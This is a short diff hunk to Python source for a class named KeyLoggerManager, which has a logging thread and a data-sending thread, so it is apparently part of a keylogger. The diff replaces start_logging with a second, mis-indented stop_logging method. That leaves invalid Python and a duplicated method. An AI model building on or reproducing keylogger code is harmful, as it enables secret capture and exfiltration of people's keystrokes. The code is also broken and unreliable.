@@ -13,10 +13,10 @@ class KeyLoggerManager(IKeyLoggerManager):
         self.__send_data_thread = threading.Thread(target=self.__send_data)
 
 
-    def start_logging(self):
-        self.__is_logging = True
-        self.__logger_thread.start()
-        self.__send_data_thread.start()
+    def stop_logging(self):
+    self.__is_logging = False
+    if hasattr(self, 'listener'):
+        self.listener.stop()
 
     def stop_logging(self):
         self.__is_logging = False
